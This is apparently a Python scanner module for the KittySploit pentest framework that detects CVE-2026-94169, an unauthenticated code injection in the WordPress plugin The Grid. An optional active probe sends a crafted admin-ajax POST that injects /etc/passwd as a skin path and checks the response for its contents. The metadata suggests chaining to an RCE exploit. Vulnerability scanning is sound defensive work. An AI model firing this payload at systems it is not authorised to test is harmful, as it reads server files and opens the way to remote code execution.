#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Grid <= 2.8.1 unauthenticated code injection (CVE-2026-94169)."""

from __future__ import annotations

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "the-grid"
_VULN_HIGH = (2, 8, 1)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "The Grid CVE-2026-94169 code injection detect",
        "description": (
            "CVE-2026-94169: the_grid_load_more grid_data skins allow PHP path "
            "injection (Nuclei: /etc/passwd disclosure oracle)."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-94169",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-94169",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-94169.yaml",
        ],
        "modules": ["exploits/multi/http/the_grid_cve_2026_94169_rce"],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "the-grid",
            "rce",
            "cve-2026-94169",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "file_read"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/the_grid_cve_2026_94169_rce",
                ],
            },
        },
    }

    active_probe = OptBool(
        False,
        "POST admin-ajax grid_data injection probe (reads /etc/passwd if vulnerable)",
        required=False,
    )

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, "/") or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        readme = self.http_request(
            method="GET",
            path=f"/wp-content/plugins/{_PLUGIN}/readme.txt",
            allow_redirects=True,
        )
        if not readme or int(readme.status_code) != 200:
            return False
        if "the grid" not in (readme.text or "").lower():
            return False
        if not version:
            version = self.wp_extract_version_from_readme(readme.text or "") or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        if not self.active_probe:
            self.set_info(
                severity="high",
                cve="CVE-2026-94169",
                reason=(
                    f"The Grid {version or 'unknown'} in vulnerable range; "
                    "injection probe not run (set active_probe)"
                ),
                version=version or "unknown",
            )
            return True
        grid = f"ks{secrets.token_hex(4)}"
        data = (
            f"action=the_grid_load_more&grid_nonce=invalid&grid_page=1&grid_name={grid}"
            "&grid_data[item_number]=1"
            "&grid_data[grid_skins][evil][php]=/etc/passwd"
            "&grid_data[grid_skins][evil][type]=grid"
            "&grid_data[grid_skins][evil][slug]=evil"
            '&grid_data[skins]={"post":"evil"}'
        )
        resp = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=True,
        )
        if not resp or int(resp.status_code) != 200:
            return False
        ctype = str((resp.headers or {}).get("Content-Type") or "")
        if "json" not in ctype.lower():
            return False
        body = resp.text or ""
        if not re.search(r"root:.*:0:0:", body):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-94169",
            reason="the_grid_load_more returned /etc/passwd content",
            version=version or "unknown",
            confidence="high",
        )
        return True
